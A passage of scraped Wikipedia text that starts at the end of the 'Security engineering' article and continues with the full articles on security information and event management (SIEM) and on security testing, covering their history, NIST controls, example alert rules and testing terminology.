 (esp. 
CPTED
)


Mantrap


Physical security


Secrecy


Secure cryptoprocessor


Security through obscurity






Misc. Topics




Full disclosure (computer security)


Security awareness


Security community


Steganography


Kerckhoffs's principle








References
[
edit
]






^
 
"Security Engineering - an overview | ScienceDirect Topics"
. 
www.sciencedirect.com
. Retrieved 
2020-10-27
.




^
 
Ware, Willis H. (January 1967). 
"Security and Privacy in Computer Systems"
.




^
 
Ware, Willis H. (January 1979). 
"Security Controls for Computer Systems: Report of Defense Science Board Task Force on Computer Security"
.




^
 
"Landscaping for security"
. 
Sunset
. 1988. Archived from 
the original
 on 2012-07-18.




^
 
"patterns & practices of Security Engineering"
.




^
 
Watson, Philip (May 20, 2013). 
"Corporate vs. Product Security"
. 
SANS Institute Information Security Reading Room
. SANS Institute
. Retrieved 
October 13,
 2020
.






Further reading
[
edit
]


Ross Anderson
 (2001). 
Security Engineering
. Wiley. 
ISBN
 
0-471-38922-6
.


Ross Anderson
 (2008). 
Security Engineering - A Guide to Building Dependable Distributed Systems
. Wiley. 
ISBN
 
978-0-470-06852-6
.


Ross Anderson
 (2001). 
"Why Information Security is Hard - An Economic Perspective"
 
(PDF)
. 
Proc. Annual Computer Security Applications Conference
. 
doi
:
10.1109/ACSAC.2001.991552
.


Bruce Schneier
 (1995). 
Applied Cryptography
 (2nd ed.). Wiley. 
ISBN
 
0-471-11709-9
.


Bruce Schneier (2000). 
Secrets and Lies: Digital Security in a Networked World
. Wiley. 
ISBN
 
0-471-25311-1
.


David A. Wheeler (2003). 
"Secure Programming for Linux and Unix HOWTO"
. 
Linux Documentation Project
. Archived from 
the original
 on 2007-04-28
. Retrieved 
2005-12-19
.


Ron Ross, Michael McEvilley, Janet Carrier Oren (2016). 
"Systems Security Engineering"
 
(PDF)
. 
Internet of Things
. Retrieved 
2016-11-22
.
{{
cite web
}}
:  CS1 maint: multiple names: authors list (
link
)


Articles and papers
[
edit
]


patterns & practices Security Engineering on Channel9


patterns & practices Security Engineering on MSDN


patterns & practices Security Engineering Explained


Basic Target Hardening
 from the Government of South Australia


v
t
e
Engineering


History


Outline


List of engineering branches


Specialties
and
Interdisciplinarity
Civil


Architectural


Coastal


Construction


Earthquake


Environmental


Ecological


Sanitary


Geological


Geotechnical


Hydraulic


Mining


Municipal/Urban


Offshore


River


Structural


Transportation


Traffic


Railway


Mechanical


Acoustic


Aerospace


Automotive


Biomechanical


Energy


Manufacturing


Marine


Naval architecture


Railway


Sports


Thermal


Tribology


Electrical


Broadcast


Computer


outline


Control


Electromechanics


Electronics


Microwaves


Optical


Power


Radio frequency


Signal processing


Telecommunications


Chemical


Biochemical
/Bioprocess


Biological


Bioresource


Genetic


Tissue


Chemical reaction


Electrochemical


Food


Molecular


Paper


Petroleum


Process


Reaction


Materials


Biomaterial


Ceramics


Corrosion


Metallurgy


Molecular


Nanotechnology


Polymers


Semiconductors


Surfaces


Other


Agricultural


Audio


Automation


Biomedical


Bioinformatics


Clinical


Health technology


Pharmaceutical


Rehabilitation


Building services


MEP


Geoengineering


Design


Engineering drawing
/graphics


Engineering management


Engineering mathematics


Engineering physics


Explosives


Facilities


Fire


Forensic


Geomatics


Industrial


Information


Instrumentation


and Control


Logistics


Robotics


Mechatronics


Military


Nuclear


Ontology


Packaging


Privacy


Safety


Survey


Security


Software


Sustainability


Systems


Textile


Engineering education


Bachelor of Engineering


Bachelor of Science


Master's degree


Doctorate


Graduate certificate


Engineer's degree


Licensed engineer


Related topics


Engineer


Glossaries


Engineering

A–L


M–Z


Aerospace engineering


Civil engineering


Electrical and electronics engineering


Mechanical engineering


Structural engineering




 
Category


 
Commons


 
Wikiproject


 
Portal












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Security_engineering&oldid=1172213303
"


Category
: 
Security engineering
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Articles needing additional references from June 2017
All articles needing additional references
CS1 maint: multiple names: authors list











From Wikipedia, the free encyclopedia






Computer security
Security information and event management (SIEM)
 is a field within 
computer security
 that combines 
security information management
 (SIM) and 
security event management
 (SEM) to enable real-time analysis of security alerts generated by applications and network hardware.
[
1
]
[
2
]
 SIEM systems are central to the operation of 
security operations centers
 (SOCs), where they are employed to detect, investigate, and respond to security incidents.
[
3
]
 SIEM technology collects and aggregates data from various systems, allowing organizations to meet compliance requirements while safeguarding against threats.

SIEM tools can be implemented as software, hardware, or managed services.
[
4
]
 SIEM systems log security events and generating reports to meet regulatory frameworks such as the 
Health Insurance Portability and Accountability Act
 (HIPAA) and the 
Payment Card Industry Data Security Standard
 (PCI DSS). The integration of SIM and SEM within SIEM provides organizations with a centralized approach for monitoring security events and responding to threats in real-time.

First introduced by 
Gartner
 analysts Mark Nicolett and Amrit Williams in 2005, the term SIEM has evolved to incorporate advanced features such as threat intelligence and behavioral analytics, which allow SIEM solutions to manage complex cybersecurity threats, including 
zero-day vulnerabilities
 and 
polymorphic malware
.

In recent years, SIEM has become increasingly incorporated into national cybersecurity initiatives. For instance, Executive Order 14028 signed in 2021 by U.S. President Joseph Biden mandates the use of SIEM technologies to improve incident detection and reporting in federal systems. Compliance with these mandates is further reinforced by frameworks such as NIST SP 800-92, which outlines best practices for managing computer security logs.
[
2
]






History
[
edit
]


Initially, 
system logging
 was primarily used for troubleshooting and debugging. However, as operating systems and networks have grown more complex, so has the generation of system logs. The monitoring of system logs has also become increasingly common due to the rise of sophisticated 
cyberattacks
 and the need for compliance with regulatory frameworks, which mandate logging 
security controls
 within 
risk management frameworks
 (RMF). 

Starting in the late 1970s, working groups began establishing criteria for managing auditing and monitoring programs, laying the groundwork for modern cybersecurity practices, such as insider threat detection and incident response. A key publication during this period was NIST’s Special Publication 500-19.
[
5
]


In 2005, the term "SIEM" (Security Information and Event Management) was introduced by Gartner analysts Mark Nicolett and Amrit Williams. SIEM systems provide a single interface for gathering security data from information systems and presenting it as actionable intelligence.
[
6
]
 The 
National Institute of Standards and Technology
 provides the following definition of SIEM: "Application that provides the ability to gather security data from information system components and present that data as actionable information via a single interface."
[
2
]
 In addition, NIST has designed and implemented a federally mandated RMF.

With the implementation of RMFs globally, auditing and monitoring have become central to 
information assurance
 and security. Cybersecurity professionals now rely on logging data to perform real-time security functions, driven by governance models that incorporate these processes into analytical tasks. As information assurance matured in the late 1990s and into the 2000s, the need to centralize system logs became apparent. Centralized log management allows for easier oversight and coordination across networked systems.

On May 17, 2021, U.S. President Joseph Biden signed Executive Order 14028, "Improving the Nation's Cybersecurity," which established further logging requirements, including audit logging and endpoint protection, to enhance incident response capabilities.
[
7
]
 This order was a response to an increase in 
ransomware
 attacks targeting critical infrastructure. By reinforcing information assurance controls within RMFs, the order aimed to drive compliance and secure funding for cybersecurity initiatives. 



Information assurance
[
edit
]


Published in September 2006, the NIST SP 800-92 Guide to Computer Security Log Management serves as a key document within the 
NIST Risk Management Framework
 to guide what should be auditable. As indicated by the absence of the term "SIEM", the document was released before the widespread adoption of SIEM technologies.
[
8
]
[
9
]
 Although the guide is not exhaustive due to rapid changes in technology since its publication, it remains relevant by anticipating industry growth. NIST is not the only source of guidance on regulatory mechanisms for auditing and monitoring, and many organizations are encouraged to adopt SIEM solutions rather than relying solely on host-based checks.

Several regulations and standards reference NIST’s logging guidance, including the Federal Information Security Management Act (FISMA),
[
10
]
 Gramm-Leach-Bliley Act (GLBA),
[
11
]
 Health Insurance Portability and Accountability Act (HIPAA),
[
12
]
 Sarbanes-Oxley Act (SOX) of 2002,
[
13
]
 Payment Card Industry Data Security Standard (PCI DSS),
[
14
]
 and ISO 27001.
[
15
]
 Public and private organizations frequently reference NIST documents in their security policies.

NIST SP 800-53 AU-2 Event Monitoring is a key security control that supports system auditing and ensures continuous monitoring for information assurance and cybersecurity operations. SIEM solutions are typically employed as central tools for these efforts. Federal systems categorized based on their impact on confidentiality, integrity, and availability (CIA) have five specific logging requirements (AU-2 a-e) that must be met.
[
16
]
 While logging every action is possible, it is generally not recommended due to the volume of logs and the need for actionable security data. AU-2 provides a foundation for organizations to build a logging strategy that aligns with other controls.

NIST SP 800-53 SI-4 System Monitoring outlines the requirements for monitoring systems, including detecting unauthorized access and tracking anomalies, malware, and potential attacks. This security control specifies both the hardware and software requirements for detecting suspicious activities.
[
17
]
 Similarly, NIST SP 800-53 RA-10 Threat Hunting, added in Revision 5, emphasizes proactive network defense by identifying threats that evade traditional controls. SIEM solutions play a critical role in aggregating security information for threat hunting teams.
[
18
]


Together, AU-2, SI-4, and RA-10 demonstrate how NIST controls integrate into a comprehensive security strategy. These controls, supported by SIEM solutions, help ensure continuous monitoring, risk assessments, and in-depth defense mechanisms across federal and private networks.
[
18
]




Terminology
[
edit
]


The acronyms 
SEM
, 
SIM
 and 
SIEM
 have sometimes been used interchangeably,
[
19
]
 but generally refer to the different primary focus of products:



Log management
: Focus on simple collection and storage of 
log messages
 and 
audit trails
.
[
8
]


Security information management
 (
SIM
): Long-term storage as well as analysis and reporting of log data.
[
20
]


Security event manager
 (
SEM
): Real-time monitoring, correlation of events, notifications and console views.


Security information and event management
 (SIEM): Combines SIM and SEM and provides real-time analysis of security alerts generated by network hardware and applications.
[
4
]
[
citation needed
]


Managed Security Service:
 (
MSS
) or 
Managed Security Service Provider:
 (MSSP): The most common managed services appear to evolve around connectivity and bandwidth, network monitoring, security, 
virtualization
, and disaster recovery.


Security as a service (
SECaaS
)
: These security services often include 
authentication
, 
anti-virus
, 
anti-malware
/spyware, 
intrusion detection
, penetration testing and security event management, among others.


In practice many products in this area will have a mix of these functions, so there will often be some overlap – and many commercial vendors also promote their own terminology.
[
21
]
 Oftentimes commercial vendors provide different combinations of these functionalities which tend to improve SIEM overall. Log management alone doesn't provide real-time insights on network security, SEM on its own won't provide complete data for deep threat analysis. When SEM and log management are combined, more information is available for SIEM to monitor.

A key focus is to monitor and help manage user and service privileges, 
directory services
 and other
[
clarification needed
]
 system-configuration changes; as well as providing log auditing and review and incident response.
[
20
]




Capabilities
[
edit
]


Data aggregation:
 
Log management
 aggregates data from many sources, including networks, security, servers, databases, applications, providing the ability to consolidate monitored data to help avoid missing crucial events.


Correlation:
 Looks for common attributes and links events together into meaningful bundles. This technology provides the ability to perform a variety of correlation techniques to integrate different sources, in order to turn data into useful information. Correlation is typically a function of the Security Event Management portion of a full SIEM solution.
[
22
]


Alerting:
 The automated analysis of correlated events.


Dashboards:
 Tools can take event data and turn it into informational charts to assist in seeing patterns, or identifying activity that is not forming a standard pattern.


Compliance:
 Applications can be employed to automate the gathering of compliance data, producing reports that adapt to existing security, governance and auditing processes.
[
23
]


Retention:
 Employing long-term storage of historical data to facilitate correlation of data over time, and to provide the retention necessary for compliance requirements. The Long term log 
data retention
 is critical in forensic investigations as it is unlikely that the discovery of a network breach will be at the time of the breach occurring.
[
24
]


Forensic analysis:
 The ability to search across logs on different nodes and time periods based on specific criteria. This mitigates having to aggregate log information in your head or having to search through thousands and thousands of logs.
[
23
]


Components
[
edit
]


Basic SIEM Infrastructure


SIEM architectures may vary by vendor; however, generally, essential components comprise the SIEM engine. The essential components of a SIEM are as follows:
[
25
]




A data collector forwards selected audit logs from a host (agent based or host based log streaming into index and aggregation point) 
[
26
]
[
27
]


An ingest and indexing point aggregation point for parsing, correlation, and 
data normalization
[
28
]


A search node that is used for visualization, queries, reports, and alerts (analysis take place on a search node) 
[
29
]


A basic SIEM infrastructure is depicted in the image to the right.



Use cases
[
edit
]


Computer security researcher 
Chris Kubecka
 identified the following SIEM use cases, presented at the hacking conference 28C3 (
Chaos Communication Congress
).
[
30
]




SIEM visibility and anomaly detection could help detect 
zero-days
 or 
polymorphic code
. Primarily due to low rates of 
anti-virus
 detection against this type of rapidly changing malware.


Parsing, log normalization and categorization can occur automatically, regardless of the type of computer or network device, as long as it can send a log.


Visualization with a SIEM using security events and log failures can aid in pattern detection.


Protocol anomalies that can indicate a misconfiguration or a security issue can be identified with a SIEM using pattern detection, alerting, baseline and dashboards.


SIEMS can detect covert, malicious communications and encrypted channels.


Cyberwarfare
 can be detected by SIEMs with accuracy, discovering both attackers and victims.


Correlation rules examples
[
edit
]


SIEM systems can have hundreds and thousands of correlation rules. Some of these are simple, and some are more complex. Once a correlation rule is triggered the system can take appropriate steps to mitigate a cyber attack. Usually, this includes sending a notification to a user and then possibly limiting or even shutting down the system.



Brute Force Detection
[
edit
]


Brute force detection is relatively straightforward. Brute forcing relates to continually trying to guess a variable. It most commonly refers to someone trying to constantly guess your password - either manually or with a tool. However, it can refer to trying to guess URLs or important file locations on your system.

An automated brute force is easy to detect as someone trying to enter their password 60 times in a minute is impossible.



Impossible Travel
[
edit
]


When a user logs in to a system, generally speaking, it creates a timestamp of the event. Alongside the time, the system may often record other useful information such as the device used, physical location, IP address, incorrect login attempts, etc. The more data is collected the more use can be gathered from it. For impossible travel, the system looks at the current and last login date/time and the difference between the recorded distances. If it deems it's not possible for this to happen, for example traveling hundreds of miles within a minute, then it will set off a warning.

Many employees and users are now using VPN services which may obscure physical location. This should be taken into consideration when setting up such a rule.



Excessive File Copying
[
edit
]


The average user does not typically copy or move files on the system repeatedly. Thus, any excessive file copying on a system could be attributed to an attacker wanting to cause harm to an organization. Unfortunately, it's not as simple as stating someone has gained access to your network illegally and wants to steal confidential information. It could also be an employee looking to sell company information, or they could just want to take home some files for the weekend.



DDoS Attack
[
edit
]


A DDoS (Distributed Denial of Service) Attack could cause significant damage to a company or organization. A DDoS attack can not only take a website offline, it can also make a system weaker. With suitable correlation rules in place, a SIEM should trigger an alert at the start of the attack so that the company can take the necessary precautionary measures to protect vital systems.



File Integrity Change
[
edit
]


File Integrity and Change Monitoring (FIM) is the process of monitoring the files on your system. Unexpected changes in your system files will trigger an alert as it's a likely indication of a cyber attack.



Alerting examples
[
edit
]


Some examples of customized rules to alert on event conditions involve user authentication rules, attacks detected and infections detected.
[
31
]








Rule


Goal


Trigger


Event Sources





Repeat Attack-Login Source


Early warning for brute force attacks, password guessing, and misconfigured applications.


Alert on 3 or more failed logins in 1 minute from a single host.


Active Directory, Syslog (Unix Hosts, Switches, Routers, VPN), RADIUS, TACACS, Monitored Applications.





Repeat Attack-Firewall


Early warning for scans, worm propagation, etc.


Alert on 15 or more Firewall Drop/Reject/Deny Events from a single IP Address in one minute.



Firewalls, Routers and Switches.





Repeat Attack-Network Intrusion Prevention System


Early warning for scans, worm propagation, etc.


Alert on 7 or more IDS Alerts from a single IP Address in one minute


Network Intrusion Detection and Prevention Devices





Repeat Attack-Host Intrusion Prevention System


Find hosts that may be infected or compromised
(exhibiting infection behaviors)


Alert on 3 or more events from a single IP Address in 10 minutes


Host Intrusion Prevention System Alerts





Virus Detection/Removal


Alert when a virus, spyware or other malware is detected on a host


Alert when a single host sees an identifiable piece of malware


Anti-Virus, HIPS, Network/System Behavioral Anomaly Detectors





Virus or Spyware Detected but Failed to Clean


Alert when >1 Hour has passed since malware was detected, on a source, with no corresponding virus successfully removed


Alert when a single host fails to auto-clean malware within 1 hour of detection


Firewall, NIPS, Anti-Virus, HIPS, Failed Login Events



See also
[
edit
]


Computer security incident management


Gordon–Loeb model
 for cyber security investments


IT risk


Log management


Network detection and response


Security orchestration
, automation and response


References
[
edit
]






^
 
"What is SIEM"
. 
IBM
. 2024
. Retrieved 
25 January
 2024
.




^ 
a
 
b
 
c
 
Johnson, Arnold; Dempsey, Kelley; Ross, Ron; Gupta, Sarbari; Bailey, Dennis (10 October 2019). 
"Guide for Security-Focused Configuration Management of Information Systems"
 
(PDF)
. 
National Institute of Standards and Technology
. 
doi
:
10.6028/nist.sp.800-128
. 
S2CID
 
63907907
. Retrieved 
23 January
 2024
.




^
 
Cinque, Marcello; Cotroneo, Domenico; Pecchia, Antonio (2018). 
Challenges and Directions in Security Information and Event Management (SIEM)
. pp. 95–99. 
doi
:
10.1109/ISSREW.2018.00-24
. 
ISBN
 
978-1-5386-9443-5
. Retrieved 
2024-02-02
.




^ 
a
 
b
 
"SIEM: A Market Snapshot"
. Dr.Dobb's Journal. 5 February 2007.




^
 
Ruthberg, Zella; McKenzie, Robert (1 October 1977). 
Audit and evaluation of computer security
. 
U.S. Department of Commerce
. 
doi
:
10.6028/NBS.SP.500-19
. Retrieved 
23 January
 2024
.




^
 


Williams, Amrit (2005-05-02). 
"Improve IT Security With Vulnerability Management"
. Retrieved 
2016-04-09
. 
Security information and event management (SIEM)




^
 
"Improving the Nation's Cybersecurity"
. 
Federal Register
. 2021-05-17
. Retrieved 
2021-07-28
.




^ 
a
 
b
 
Kent, Karen; Souppaya, Murugiah (13 September 2006). 
"Guide to Computer Security Log Management"
. 
National Institute of Standards and Technology
. 
doi
:
10.6028/NIST.SP.800-92
. 
S2CID
 
221183642
. Retrieved 
24 January
 2024
.




^
 
"NIST Risk Management Framework"
. 
National Institute of Standards and Technology
. 7 November 2024
. Retrieved 
25 January
 2024
.




^
 
Computer Security Division, Information Technology Laboratory (2016-11-30). 
"NIST Risk Management Framework | CSRC | CSRC"
. 
CSRC | NIST
. Retrieved 
2021-07-23
.




^
 
"Understanding the NIST cybersecurity framework"
. 
Federal Trade Commission
. 2018-10-05
. Retrieved 
2021-07-23
.




^
 
Rights (OCR), Office for Civil (2009-11-20). 
"Summary of the HIPAA Security Rule"
. 
HHS.gov
. Retrieved 
2021-07-23
.




^
 
"The Role of Information Security in Sarbanes-Oxley Compliance"
. 
Issues in Information Systems
. 2005. 
doi
:
10.48009/2_iis_2005_124-130
. 
ISSN
 
1529-7314
.




^
 
"Mapping PCI DSS v3_2_1 to the NIST Cybersecurity Framework v1_1"
 
(PDF)
. July 2019.




^
 
"NIST SP 800-53, Revision 5 Control Mappings to ISO/IEC 27001"
. 10 December 2020.




^
 
"Risk Management Framework for Information Systems and Organizations"
 
(PDF)
. 
National Institute of Standards and Technology
. December 2018. 
doi
:
10.6028/nist.sp.800-37r2
. Retrieved 
24 January
 2024
.




^
 
Computer Security Division, Information Technology Laboratory (2016-11-30). 
"Release Search - NIST Risk Management Framework | CSRC | CSRC"
. 
CSRC | NIST
. Retrieved 
2021-07-19
.




^ 
a
 
b
 
"Security and Privacy Controls for Information Systems and Organizations"
 
(PDF)
. 
National Institute of Standards and Technology
. 12 October 2020. 
doi
:
10.6028/NIST.SP.800-53r5
. Retrieved 
24 January
 2024
.




^
 
Swift, David (26 December 2006). 
"A Practical Application of SIM/SEM/SIEM, Automating Threat Identification"
 
(PDF)
. 
SANS Institute
. p. 3
. Retrieved 
14 May
 2014
. 
...the acronym SIEM will be used generically to refer...




^ 
a
 
b
 
Jamil, Amir (29 March 2010). 
"The difference between SEM, SIM and SIEM"
.




^
 
Bhatt, S.; Manadhata, P.K.; Zomlot, L. (2014). 
"The Operational Role of Security Information and Event Management Systems"
. 
IEEE Security & Privacy
. 
12
 (5): 35–41. 
doi
:
10.1109/MSP.2014.103
. 
S2CID
 
16419710
.




^
 
Correlation
 
Archived
 2014-10-19 at the 
Wayback Machine




^ 
a
 
b
 
"Compliance Management and Compliance Automation – How and How Efficient, Part 1"
. 
accelops.net
. Archived from 
the original
 on 2011-07-23
. Retrieved 
2018-05-02
.




^
 
"2018 Data Breach Investigations Report | Verizon Enterprise Solutions"
. 
Verizon Enterprise Solutions
. Retrieved 
2018-05-02
.




^
 
Kotenko, Igor; Polubelova, Olga; Saenko, Igor (November 2012). 
"The Ontological Approach for SIEM Data Repository Implementation"
. 
2012 IEEE International Conference on Green Computing and Communications
. Besancon, France: IEEE. pp. 761–766. 
doi
:
10.1109/GreenCom.2012.125
. 
ISBN
 
978-1-4673-5146-1
. 
S2CID
 
18920083
.




^
 
Kotenko, Igor; Chechulin, Andrey (November 2012). 
"Common Framework for Attack Modeling and Security Evaluation in SIEM Systems"
. 
2012 IEEE International Conference on Green Computing and Communications
. pp. 94–101. 
doi
:
10.1109/GreenCom.2012.24
. 
ISBN
 
978-1-4673-5146-1
. 
S2CID
 
15834187
.




^
 
Karl-Bridge-Microsoft. 
"Eventlog Key - Win32 apps"
. 
docs.microsoft.com
. Retrieved 
2021-07-18
.




^
 
Kotenko, Igor; Polubelova, Olga; Saenko, Igor (November 2012). 
"The Ontological Approach for SIEM Data Repository Implementation"
. 
2012 IEEE International Conference on Green Computing and Communications
. pp. 761–766. 
doi
:
10.1109/GreenCom.2012.125
. 
ISBN
 
978-1-4673-5146-1
. 
S2CID
 
18920083
.




^
 
Azodi, Amir; Jaeger, David; Cheng, Feng; Meinel, Christoph (December 2013). 
"Pushing the Limits in Event Normalisation to Improve Attack Detection in IDS/SIEM Systems"
. 
2013 International Conference on Advanced Cloud and Big Data
. pp. 69–76. 
doi
:
10.1109/CBD.2013.27
. 
ISBN
 
978-1-4799-3261-0
. 
S2CID
 
1066886
.




^
 
"28c3: Security Log Visualization with a Correlation Engine"
. 
YouTube
. December 29, 2011. 
Archived
 from the original on 2021-12-15
. Retrieved 
November 4,
 2017
.




^
 
Swift, David (2010). 
"Successful SIEM and Log Management Strategies for Audit and Compliance"
. 
SANS Institute
.






External links
[
edit
]


Essential SIEM Correlation Rules for Compliance
.


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Security_information_and_event_management&oldid=1244873873
"


Category
: 
Data security
Hidden categories: 
Webarchive template wayback links
Articles with short description
Short description is different from Wikidata
All articles with unsourced statements
Articles with unsourced statements from January 2024
Wikipedia articles needing clarification from March 2016











From Wikipedia, the free encyclopedia






The process of finding flaws in the security of information systems


This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Security testing"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
August 2019
)
 (
Learn how and when to remove this message
)


Security testing
 is a process intended to detect flaws in the 
security
 mechanisms of an 
information system
 and as such help enable it to protect data and maintain functionality as intended.
[
1
]
 Due to the logical limitations of security testing, passing the security testing process is not an indication that no flaws exist or that the system adequately satisfies the security requirements.

Typical security requirements may include specific elements of 
confidentiality
, 
integrity
, 
authentication
, availability, authorization and 
non-repudiation
.
[
2
]
 Actual security requirements tested depend on the security requirements implemented by the system. Security testing as a term has a number of different meanings and can be completed in a number of different ways. As such, a Security Taxonomy helps us to understand these different approaches and meanings by providing a base level to work from.





Confidentiality
[
edit
]


A security measure which protects against the disclosure of information to parties other than the intended recipient is by no means the only way of ensuring the security.


Integrity
[
edit
]


Integrity of information refers to protecting information from being modified by unauthorized parties



A measure intended to allow the receiver to determine that the information provided by a system is correct.


Integrity schemes often use some of the same underlying technologies as confidentiality schemes, but they usually involve adding information to a communication, to form the basis of an algorithmic check, rather than the encoding all of the communication.


To check if the correct information is transferred from one application to other.


Authentication
[
edit
]


This might involve confirming the identity of a person, tracing the origins of an artifact, ensuring that a product is what its packaging and labelling claims to be, or assuring that a 
computer program
 is a trusted one.



Authorization
[
edit
]


The process of determining that a requester is allowed to receive a service or perform an operation.


Access control
 is an example of authorization.


Availability
[
edit
]


Assuring information and communications services will be ready for use when expected.


Information must be kept available to authorized persons when they need it.


Non-repudiation
[
edit
]


In reference to digital security, non-repudiation means to ensure that a transferred message has been sent and received by the parties claiming to have sent and received the message. Non-repudiation is a way to guarantee that the sender of a message cannot later deny having sent the message and that the recipient cannot deny having received the message.


A sender-id is usually a header transmitted along with message which recognises the message source.


Taxonomy
[
edit
]


Common terms used for the delivery of security testing:



Discovery
 - The purpose of this stage is to identify systems within scope and the services in use. It is not intended to discover vulnerabilities, but version detection may highlight deprecated versions of 
software
 / firmware and thus indicate potential vulnerabilities.


Vulnerability Scan
 - Following the discovery stage this looks for known security issues by using automated tools to match conditions with known vulnerabilities. The reported risk level is set automatically by the tool with no manual verification or interpretation by the test vendor. This can be supplemented with credential based scanning that looks to remove some common 
false positives
 by using supplied credentials to authenticate with a service (such as local windows accounts).


Vulnerability Assessment
 - This uses discovery and vulnerability scanning to identify security vulnerabilities and places the findings into the context of the environment under test. An example would be removing common false positives from the report and deciding risk levels that should be applied to each report finding to improve business understanding and context.


Security Assessment
 - Builds upon Vulnerability Assessment by adding manual verification to confirm exposure, but does not include the exploitation of vulnerabilities to gain further access. Verification could be in the form of authorized access to a system to confirm system settings and involve examining logs, system responses, error messages, codes, etc. A Security Assessment is looking to gain a broad coverage of the systems under test but not the depth of exposure that a specific vulnerability could lead to.


Penetration Test
 - 
Penetration test
 simulates an attack by a malicious party. Building on the previous stages and involves exploitation of found vulnerabilities to gain further access. Using this approach will result in an understanding of the ability of an attacker to gain access to confidential information, affect data integrity or availability of a service and the respective impact. Each test is approached using a consistent and complete methodology in a way that allows the tester to use their problem solving abilities, the output from a range of tools and their own knowledge of networking and systems to find vulnerabilities that would or could not be identified by automated tools. This approach looks at the depth of attack as compared to the Security Assessment approach that looks at the broader coverage.


Security Audit
 - Driven by an Audit and Risk function to look at a specific control or compliance issue. Characterized by a narrow scope, this type of engagement could make use of any of the earlier approaches discussed (
vulnerability assessment
, security assessment, penetration test).


Security Review
 - Verification that industry or internal security standards have been applied to system components or product. This is typically completed through gap analysis and utilizes build and code reviews or by reviewing design documents and architecture diagrams. This activity does not utilize any of the earlier approaches (Vulnerability Assessment, Security Assessment, Penetration Test, Security Audit)


Tools
[
edit
]


Container
 and 
Infrastructure
 Security Analysis
[
3
]
[
4
]


SAST - Static Application Security Testing


DAST - Dynamic Application Security Testing


IAST - Interactive Application Security Testing
[
5
]


DLP - Data Loss Prevention


IDS, IPS - Intrusion Detection System, Intrusion Prevention System


OSS Scanning - Open Source Software Scanning (see 
Open-source software security
)


RASP - Runtime Application Self-Protection


SCA - 
Software Composition Analysis
[
6
]


WAF - Web Application Firewall


See also
[
edit
]


National Information Assurance Glossary


References
[
edit
]






^
 
M Martellini, & Malizia, A. (2017). Cyber and chemical, biological, radiological, nuclear, explosives challenges : threats and counter efforts. Springer.




^
 
"Introduction to Information Security" US-CERT 
https://www.us-cert.gov/security-publications/introduction-information-security




^
 
"Container Security Verification Standard"
. 
GitHub
. 20 July 2022.




^
 
"Infrastructure as Code Security - OWASP Cheat Sheet Series"
.




^
 
"OWASP DevSecOps Guideline - v-0.2 | OWASP Foundation"
.




^
 
"Component Analysis | OWASP Foundation"
.






v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Software testing
The "box" approach


Black-box testing


All-pairs testing


Exploratory testing


Fuzz testing


Model-based testing


Scenario testing


Grey-box testing


White-box testing


API testing


Mutation testing


Static testing


Testing levels


Acceptance testing


Integration testing


System testing


Unit testing


Testing types, techniques,
and 
tactics


A/B testing


Benchmark


Compatibility testing


Concolic testing


Concurrent testing


Conformance testing


Continuous testing


Destructive testing


Development testing


Differential testing


Dynamic program analysis


Installation testing


Negative testing


Random testing


Regression testing


Security testing


Smoke testing (software)


Software performance testing


Stress testing


Symbolic execution


Test automation


Usability testing


See also


Graphical user interface testing


Manual testing


Orthogonal array testing


Pair testing


Soak testing


Software reliability testing


Stress testing


Web testing












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Security_testing&oldid=1190590752
"


Categories
: 
Computer security
Security testing
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Articles needing additional references from August 2019
